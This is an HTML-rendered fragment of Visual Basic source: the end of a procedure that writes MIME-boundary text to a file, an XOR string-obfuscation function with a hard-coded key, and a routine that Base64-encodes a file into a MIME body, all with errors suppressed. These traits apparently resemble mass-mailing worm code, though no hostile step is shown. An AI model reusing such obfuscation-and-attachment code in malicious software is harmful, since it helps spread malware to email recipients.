</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc6">(</span><span class="sc7">e</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">d</span><span class="sc0">
</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"--"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">b</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"--"</span><span class="sc0">
</span><span class="sc7">Close</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc6">(</span><span class="sc7">sText</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">ekey</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">hash</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">crbyte</span><span class="sc0">
</span><span class="sc7">ekey</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">3029</span><span class="sc0">
</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">sText</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc7">hash</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Asc</span><span class="sc6">(</span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">sText</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">))</span><span class="sc0">
    </span><span class="sc7">crbyte</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc7">hash</span><span class="sc0"> </span><span class="sc3">Xor</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">ekey</span><span class="sc0"> </span><span class="sc3">Mod</span><span class="sc0"> </span><span class="sc2">255</span><span class="sc6">))</span><span class="sc0">
    </span><span class="sc7">x</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">crbyte</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">b64</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">vsFullPathname</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
    </span><span class="sc1">'For Encoding BASE64
</span><span class="sc0">    </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">b</span><span class="sc0">           </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
    </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">b64ed</span><span class="sc0">   </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Variant</span><span class="sc0">
    </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc2">3</span><span class="sc6">)</span><span class="sc0">      </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Byte</span><span class="sc0">
    </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0">           </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
    </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc0">           </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
    </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0">           </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
    </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">FileIn</span><span class="sc0">      </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
    </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">sResult</span><span class="sc0">     </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
    </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">n</span><span class="sc0">           </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
    
    </span><span class="sc1">'b64ed=&gt;tabla de tabulación
</span><span class="sc0">    </span><span class="sc7">b64ed</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Array</span><span class="sc6">(</span><span class="sc4">"A"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"B"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"C"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"D"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"E"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"F"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"G"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"H"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"I"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"J"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"K"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"L"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"M"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"N"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"O"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"P"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Q"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"R"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"S"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"T"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"U"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"V"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"W"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"X"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Y"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Z"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"a"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"b"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"c"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"d"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"e"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"f"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"g"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"h"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"i"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"j"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"k"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"l"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"m"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"n"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"o"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"p"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"q"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"r"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"s"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"t"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"u"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"v"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"w"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"x"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"y"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"z"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"0"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"1"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"2"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"3"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"4"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"5"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"6"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"7"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"8"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"9"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"+"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"/"</span><span class="sc6">)</span><span class="sc0">
    
    </span><span class="sc3">Erase</span><span class="sc0"> </span><span class="sc7">bin</span><span class="sc0">
    </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">FileIn</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">b</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">:</span><span class="sc0">
    </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
    
    </span><span class="sc1">'Gets the next free filenumber
</span><span class="sc0">    </span><span class="sc7">FileIn</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">FreeFile</span><span class="sc0">
    
    </span><span class="sc1">'Open Base64 Input File
</span><span class="sc0">    </span><span class="sc7">Open</span><span class="sc0"> </span><span class="sc7">vsFullPathname</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Binary</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">FileIn</span><span class="sc0">
    
    </span><span class="sc7">sResult</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0">
    </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
    
    </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">LOF</span><span class="sc6">(</span><span class="sc7">FileIn</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">LOF</span><span class="sc6">(</span><span class="sc7">FileIn</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Mod</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc6">)</span><span class="sc0">
    
    </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc3">Step</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">

        </span><span class="sc1">'Read three bytes
</span><span class="sc0">        </span><span class="sc3">Get</span><span class="sc0"> </span><span class="sc7">FileIn</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">Get</span><span class="sc0"> </span><span class="sc7">FileIn</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">Get</span><span class="sc0"> </span><span class="sc7">FileIn</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc2">2</span><span class="sc6">)</span><span class="sc0">
        
        </span><span class="sc1">'Always wait until there're more then 64 characters
</span><span class="sc0">        </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">s</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&gt;</span><span class="sc0"> </span><span class="sc2">64</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">

            </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0">
            </span><span class="sc7">sResult</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">sResult</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0">
            </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">

        </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

        </span><span class="sc1">'Calc Base64-encoded char
</span><span class="sc0">        </span><span class="sc7">b</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc7">n</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">\</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc2">&amp;H3F</span><span class="sc0"> </span><span class="sc1">'right shift 2 bits (&amp;H3F=111111b)
</span><span class="sc0">        </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">b64ed</span><span class="sc6">(</span><span class="sc7">b</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc1">'the character s holds the encoded chars
</span><span class="sc0">        
        </span><span class="sc7">b</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">((</span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc7">n</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc2">&amp;H3</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Or</span><span class="sc0"> </span><span class="sc6">((</span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">\</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc2">&amp;HF</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">b64ed</span><span class="sc6">(</span><span class="sc7">b</span><span class="sc6">)</span><span class="sc0">
        
        </span><span class="sc7">b</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">((</span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc7">n</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc2">&amp;HF</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Or</span><span class="sc0"> </span><span class="sc6">((</span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc2">2</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">\</span><span class="sc0"> </span><span class="sc2">64</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc2">&amp;H3</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">b64ed</span><span class="sc6">(</span><span class="sc7">b</span><span class="sc6">)</span><span class="sc0">
        
        </span><span class="sc7">b</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc7">n</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc2">&amp;H3F</span><span class="sc0">
        </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">b64ed</span><span class="sc6">(</span><span class="sc7">b</span><span class="sc6">)</span><span class="sc0">
        
    </span><span class="sc3">Next</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0">

    </span><span class="sc1">'Now, you need to check if there is something left
</span><span class="sc0">    </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc3">Not</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">LOF</span><span class="sc6">(</span><span class="sc7">FileIn</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Mod</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">

        </span><span class="sc1">'Reads the number of bytes left
</span><span class="sc0">        </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">LOF</span><span class="sc6">(</span><span class="sc7">FileIn</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Mod</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc6">)</span><span class="sc0">
            </span><span class="sc3">Get</span><span class="sc0"> </span><span class="sc7">FileIn</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">Next</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0">
    
        </span><span class="sc1">'If there are only 2 chars left
</span><span class="sc0">        </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">LOF</span><span class="sc6">(</span><span class="sc7">FileIn</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Mod</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
            </span><span class="sc7">b</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">\</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc2">&amp;H3F</span><span class="sc0"> </span><span class="sc1">'right shift 2 bits (&amp;H3F=111111b)
</span><span class="sc0">            </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">b64ed</span><span class="sc6">(</span><span class="sc7">b</span><span class="sc6">)</span><span class="sc0">
            
            </span><span class="sc7">b</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">((</span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc2">&amp;H3</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Or</span><span class="sc0"> </span><span class="sc6">((</span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">\</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc2">&amp;HF</span><span class="sc6">)</span><span class="sc0">
            </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">b64ed</span><span class="sc6">(</span><span class="sc7">b</span><span class="sc6">)</span><span class="sc0">
            
            </span><span class="sc7">b</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">((</span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc2">&amp;HF</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Or</span><span class="sc0"> </span><span class="sc6">((</span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc2">2</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">\</span><span class="sc0"> </span><span class="sc2">64</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc2">&amp;H3</span><span class="sc6">)</span><span class="sc0">
            </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">b64ed</span><span class="sc6">(</span><span class="sc7">b</span><span class="sc6">)</span><span class="sc0">
            
            </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"="</span><span class="sc0">
        
        </span><span class="sc3">Else</span><span class="sc0"> </span><span class="sc1">'If there is only one char left
</span><span class="sc0">            </span><span class="sc7">b</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">\</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc2">&amp;H3F</span><span class="sc0"> </span><span class="sc1">'right shift 2 bits (&amp;H3F=111111b)
</span><span class="sc0">            </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">b64ed</span><span class="sc6">(</span><span class="sc7">b</span><span class="sc6">)</span><span class="sc0">
            
            </span><span class="sc7">b</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">((</span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc2">&amp;H3</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Or</span><span class="sc0"> </span><span class="sc6">((</span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">\</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc2">&amp;HF</span><span class="sc6">)</span><span class="sc0">
            </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">b64ed</span><span class="sc6">(</span><span class="sc7">b</span><span class="sc6">)</span><span class="sc0">
            
            </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"=="</span><span class="sc0">
        </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

    </span><span class="sc1">'Send the characters left
</span><span class="sc0">    </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
        </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0">
        </span><span class="sc7">sResult</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">sResult</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0">
    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
    
    </span><span class="sc1">'Send the last part of the MIME Body
</span><span class="sc0">    </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
    
    </span><span class="sc7">Close</span><span class="sc0"> </span><span class="sc7">FileIn</span><span class="sc0">
    </span><span class="sc7">b64</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">sResult</span><span class="sc0">
    
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span></div></body>
</html>
